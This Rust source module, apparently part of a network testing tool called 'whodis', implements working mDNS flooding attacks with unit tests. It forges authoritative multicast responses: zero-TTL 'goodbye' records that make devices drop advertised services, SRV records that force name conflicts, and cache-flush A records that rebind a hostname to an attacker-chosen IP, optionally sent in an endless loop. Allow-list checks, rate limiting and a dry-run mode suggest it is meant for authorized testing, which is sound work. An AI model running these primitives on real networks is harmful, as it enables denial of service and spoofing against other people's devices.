//! Disruptive mDNS flooding primitives.

use std::net::Ipv4Addr;
use std::num::NonZeroU32;
use std::sync::Arc;

use governor::{Quota, RateLimiter};
use hickory_proto::op::{Message, MessageType, OpCode, ResponseCode};
use hickory_proto::rr::rdata::{A, PTR, SRV, TXT};
use hickory_proto::rr::{DNSClass, Name, RData, Record};
use hickory_proto::serialize::binary::BinEncodable;

use crate::auth::Authorization;
use crate::error::{Error, Result};
use crate::hickory_compat::{MessageExt, RecordExt};
use crate::mode::Mode;
use crate::transport::{Destination, Transport};

const DEFAULT_RATE_PPS: u32 = 50;

#[derive(Debug, Clone, Copy)]
pub struct FloodOptions {
    pub rate_pps: NonZeroU32,
    pub count: usize, // 0 means forever
    pub dry_run: bool,
}

impl Default for FloodOptions {
    fn default() -> Self {
        Self {
            rate_pps: NonZeroU32::new(DEFAULT_RATE_PPS).unwrap_or(NonZeroU32::MIN),
            count: 1,
            dry_run: false,
        }
    }
}

pub async fn goodbye(
    mode: Mode,
    targets: &[String],
    auth: &Authorization,
    opts: FloodOptions,
) -> Result<usize> {
    auth.warn_once_if_permissive("flood:goodbye");
    if !mode.sends_responses() {
        return Err(Error::InvalidServiceType(format!(
            "flood requires Authoritative or Custom mode, got {mode:?}"
        )));
    }
    let transport = Arc::new(Transport::build(mode)?);
    let limiter = limiter(opts.rate_pps);

    let mut packets: Vec<(&str, Vec<u8>)> = Vec::with_capacity(targets.len());
    for fqdn in targets {
        if !auth.permits_instance(&strip_dot(fqdn)) {
            tracing::warn!(target = %fqdn, "blocked by allow-list");
            continue;
        }
        packets.push((fqdn.as_str(), build_goodbye(fqdn)?));
    }
    if packets.is_empty() {
        return Ok(0);
    }
    if opts.count == 0 {
        loop {
            for (i, (fqdn, bytes)) in packets.iter().enumerate() {
                limiter.until_ready().await;
                if opts.dry_run {
                    tracing::info!(target = %fqdn, bytes = bytes.len(), iter = i, "dry-run: would send");
                } else {
                    transport.send_query(bytes, Destination::Multicast).await?;
                }
            }
        }
    }
    let mut sent = 0_usize;
    for (fqdn, bytes) in &packets {
        for i in 0..opts.count {
            if opts.dry_run {
                tracing::info!(target = %fqdn, bytes = bytes.len(), iter = i, "dry-run: would send");
            } else {
                limiter.until_ready().await;
                transport.send_query(bytes, Destination::Multicast).await?;
            }
            sent += 1;
        }
    }
    Ok(sent)
}

pub async fn conflict_rename(
    mode: Mode,
    targets: &[String],
    auth: &Authorization,
    opts: FloodOptions,
) -> Result<usize> {
    auth.warn_once_if_permissive("flood:conflict");
    if !mode.sends_responses() {
        return Err(Error::InvalidServiceType(format!(
            "flood requires Authoritative or Custom mode, got {mode:?}"
        )));
    }
    let transport = Arc::new(Transport::build(mode)?);
    let limiter = limiter(opts.rate_pps);

    let mut packets: Vec<(&str, Vec<u8>)> = Vec::with_capacity(targets.len());
    for fqdn in targets {
        if !auth.permits_instance(&strip_dot(fqdn)) {
            tracing::warn!(target = %fqdn, "blocked by allow-list");
            continue;
        }
        packets.push((fqdn.as_str(), build_conflict(fqdn)?));
    }
    if packets.is_empty() {
        return Ok(0);
    }
    let mut sent = 0_usize;
    if opts.count == 0 {
        loop {
            for (i, (fqdn, bytes)) in packets.iter().enumerate() {
                limiter.until_ready().await;
                if opts.dry_run {
                    tracing::info!(target = %fqdn, bytes = bytes.len(), iter = i, "dry-run: would send");
                } else {
                    transport.send_query(bytes, Destination::Multicast).await?;
                }
            }
        }
    }
    for (fqdn, bytes) in &packets {
        for i in 0..opts.count {
            if opts.dry_run {
                tracing::info!(target = %fqdn, bytes = bytes.len(), iter = i, "dry-run: would send");
            } else {
                limiter.until_ready().await;
                transport.send_query(bytes, Destination::Multicast).await?;
            }
            sent += 1;
        }
    }
    Ok(sent)
}

pub async fn conflict_host(
    mode: Mode,
    hosts: &[String],
    ip: Ipv4Addr,
    auth: &Authorization,
    opts: FloodOptions,
) -> Result<usize> {
    auth.warn_once_if_permissive("flood:conflict-host");
    if !mode.sends_responses() {
        return Err(Error::InvalidServiceType(format!(
            "flood requires Authoritative or Custom mode, got {mode:?}"
        )));
    }
    let transport = Arc::new(Transport::build(mode)?);
    let limiter = limiter(opts.rate_pps);

    let mut packets: Vec<(&str, Vec<u8>)> = Vec::with_capacity(hosts.len());
    for host in hosts {
        if !auth.permits_instance(&strip_dot(host)) {
            tracing::warn!(target = %host, "blocked by allow-list");
            continue;
        }
        packets.push((host.as_str(), build_conflict_host(host, ip)?));
    }
    if packets.is_empty() {
        return Ok(0);
    }
    let mut sent = 0_usize;
    if opts.count == 0 {
        loop {
            for (i, (host, bytes)) in packets.iter().enumerate() {
                limiter.until_ready().await;
                if opts.dry_run {
                    tracing::info!(target = %host, bytes = bytes.len(), iter = i, "dry-run: would send");
                } else {
                    transport.send_query(bytes, Destination::Multicast).await?;
                }
            }
        }
    }
    for (host, bytes) in &packets {
        for i in 0..opts.count {
            if opts.dry_run {
                tracing::info!(target = %host, bytes = bytes.len(), iter = i, "dry-run: would send");
            } else {
                limiter.until_ready().await;
                transport.send_query(bytes, Destination::Multicast).await?;
            }
            sent += 1;
        }
    }
    Ok(sent)
}

fn limiter(
    rate: NonZeroU32,
) -> Arc<
    RateLimiter<
        governor::state::NotKeyed,
        governor::state::InMemoryState,
        governor::clock::DefaultClock,
    >,
> {
    Arc::new(RateLimiter::direct(Quota::per_second(rate)))
}

fn build_goodbye(fqdn: &str) -> Result<Vec<u8>> {
    let name = crate::name_util::lax_from_str(fqdn)?;
    let service_type = service_type_for_instance(&name, fqdn)?;
    let mut msg = Message::new(0, MessageType::Query, OpCode::Query);
    msg.set_message_type(MessageType::Response)
        .set_authoritative(true)
        .set_response_code(ResponseCode::NoError);

    let mut ptr = Record::from_rdata(service_type, 0, RData::PTR(PTR(name.clone())));
    ptr.set_dns_class(DNSClass::IN);
    msg.add_answer(ptr);

    let srv_name = name.clone();
    let mut srv = Record::from_rdata(name.clone(), 0, RData::SRV(SRV::new(0, 0, 0, srv_name)));
    srv.set_dns_class(DNSClass::IN);
    msg.add_answer(srv);

    let mut txt = Record::from_rdata(name, 0, RData::TXT(TXT::new(vec![String::new()])));
    txt.set_dns_class(DNSClass::IN);
    msg.add_answer(txt);

    Ok(msg.to_bytes()?)
}

fn build_conflict(fqdn: &str) -> Result<Vec<u8>> {
    let name = crate::name_util::lax_from_str(fqdn)?;
    let mut msg = Message::new(0, MessageType::Query, OpCode::Query);
    msg.set_message_type(MessageType::Response)
        .set_authoritative(true)
        .set_response_code(ResponseCode::NoError);

    let conflict_target = Name::from_utf8("whodis-conflict.local.")
        .map_err(|_| Error::InvalidServiceType("whodis-conflict.local.".to_string()))?;
    let mut srv = Record::from_rdata(name, 120, RData::SRV(SRV::new(0, 0, 0, conflict_target)));
    srv.set_dns_class(DNSClass::IN);
    msg.add_answer(srv);

    Ok(msg.to_bytes()?)
}

fn build_conflict_host(host: &str, ip: Ipv4Addr) -> Result<Vec<u8>> {
    let name = crate::name_util::lax_from_str(host)?;
    let mut msg = Message::new(0, MessageType::Query, OpCode::Query);
    msg.set_message_type(MessageType::Response)
        .set_authoritative(true)
        .set_response_code(ResponseCode::NoError);

    let mut a = Record::from_rdata(name, 120, RData::A(A(ip)));
    a.set_dns_class(DNSClass::IN);
    a.set_mdns_cache_flush(true);
    msg.add_answer(a);

    Ok(msg.to_bytes()?)
}

fn service_type_for_instance(instance: &Name, original: &str) -> Result<Name> {
    let labels: Vec<&[u8]> = instance.iter().collect();
    let n = labels.len();
    if n < 4 {
        return Err(Error::InvalidServiceType(original.to_string()));
    }
    let svc = labels.get(n - 3).copied().unwrap_or_default();
    let proto = labels.get(n - 2).copied().unwrap_or_default();
    let tld = labels.get(n - 1).copied().unwrap_or_default();
    let proto =
        std::str::from_utf8(proto).map_err(|_| Error::InvalidServiceType(original.to_string()))?;
    let tld =
        std::str::from_utf8(tld).map_err(|_| Error::InvalidServiceType(original.to_string()))?;
    if !svc.starts_with(b"_")
        || !(proto.eq_ignore_ascii_case("_tcp") || proto.eq_ignore_ascii_case("_udp"))
        || !tld.eq_ignore_ascii_case("local")
    {
        return Err(Error::InvalidServiceType(original.to_string()));
    }
    let service_labels = labels
        .get(n - 3..)
        .ok_or_else(|| Error::InvalidServiceType(original.to_string()))?;
    Name::from_labels(service_labels.iter().copied())
        .map_err(|_| Error::InvalidServiceType(original.to_string()))
}

fn strip_dot(s: &str) -> String {
    s.trim_end_matches('.').to_string()
}

#[cfg(test)]
mod tests {
    use hickory_proto::serialize::binary::BinDecodable;

    use super::*;

    #[test]
    fn build_goodbye_produces_three_records() {
        let bytes = build_goodbye("Foo._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        assert_eq!(msg.answers().len(), 3);
        assert!(msg.metadata.authoritative);
        for r in msg.answers() {
            assert_eq!(r.ttl(), 0);
        }
    }

    #[test]
    fn build_goodbye_ptr_owns_service_type_and_points_to_instance() {
        let bytes = build_goodbye("Foo._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        let ptr = msg.answers().first().expect("ptr answer");

        assert_eq!(ptr.name().to_string(), "_airplay._tcp.local.");
        assert!(matches!(
            ptr.data(),
            Some(hickory_proto::rr::RData::PTR(target))
                if target.0.to_string() == "Foo._airplay._tcp.local."
        ));
    }

    #[test]
    fn build_goodbye_accepts_non_std3_instance_labels() {
        let bytes = build_goodbye("Living Room._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");

        assert_eq!(
            msg.answers().first().expect("ptr").name().to_string(),
            "_airplay._tcp.local."
        );
    }

    #[test]
    fn build_goodbye_rejects_non_instance_name() {
        assert!(build_goodbye("_airplay._tcp.local.").is_err());
        assert!(build_goodbye("Foo._airplay._http.local.").is_err());
    }

    #[test]
    fn build_conflict_host_produces_one_a_record_with_cache_flush() {
        let bytes = build_conflict_host("Camera.local.", Ipv4Addr::UNSPECIFIED).expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        assert_eq!(msg.answers().len(), 1);
        assert!(msg.metadata.authoritative);
        let a = msg.answers().first().expect("answer");
        assert_eq!(a.name().to_string(), "Camera.local.");
        assert_eq!(a.ttl(), 120);
        assert!(a.mdns_cache_flush, "cache-flush bit must be set");
        assert!(matches!(
            a.data(),
            Some(hickory_proto::rr::RData::A(addr)) if addr.0 == Ipv4Addr::UNSPECIFIED
        ));
    }

    #[test]
    fn build_conflict_host_accepts_host_without_trailing_dot() {
        let bytes =
            build_conflict_host("Camera.local", Ipv4Addr::new(192, 168, 1, 1)).expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        assert_eq!(msg.answers().len(), 1);
    }

    #[test]
    fn build_conflict_host_rejects_empty_host() {
        assert!(build_conflict_host("", Ipv4Addr::UNSPECIFIED).is_err());
    }

    #[test]
    fn build_conflict_uses_whodis_target() {
        let bytes = build_conflict("Foo._airplay._tcp.local.").expect("build");
        let msg = hickory_proto::op::Message::from_bytes(&bytes).expect("parse");
        let r = msg.answers().first().expect("answer");
        let is_srv_with_conflict = matches!(
            r.data(),
            Some(hickory_proto::rr::RData::SRV(srv)) if srv.target.to_string().contains("whodis-conflict")
        );
        assert!(
            is_srv_with_conflict,
            "expected SRV record with whodis-conflict target"
        );
    }

    #[tokio::test]
    async fn dry_run_does_not_send_packets() {
        use crate::auth::Authorization;
        let auth = Authorization::new();
        let opts = FloodOptions {
            rate_pps: NonZeroU32::new(50).expect("rate"),
            count: 3,
            dry_run: true,
        };
        let mode = Mode::Custom {
            group_v4: std::net::Ipv4Addr::new(239, 255, 99, 99),
            group_v6: std::net::Ipv6Addr::new(0xff12, 0, 0, 0, 0, 0, 0, 0xabcd),
            port: 15353,
        };
        let count = goodbye(mode, &["x._test._tcp.local.".to_string()], &auth, opts)
            .await
            .expect("goodbye");
        assert_eq!(count, 3, "dry-run should still report intended send count");
    }

    #[tokio::test(start_paused = true)]
    async fn limiter_caps_rate() {
        let l = limiter(NonZeroU32::new(2).expect("rate"));
        l.until_ready().await;
        l.until_ready().await;
        let pending = tokio::spawn(async move { l.until_ready().await });
        tokio::time::advance(std::time::Duration::from_millis(400)).await;
        assert!(!pending.is_finished(), "limiter should still be holding");
        tokio::time::advance(std::time::Duration::from_millis(700)).await;
        let _joined = pending.await;
    }
}
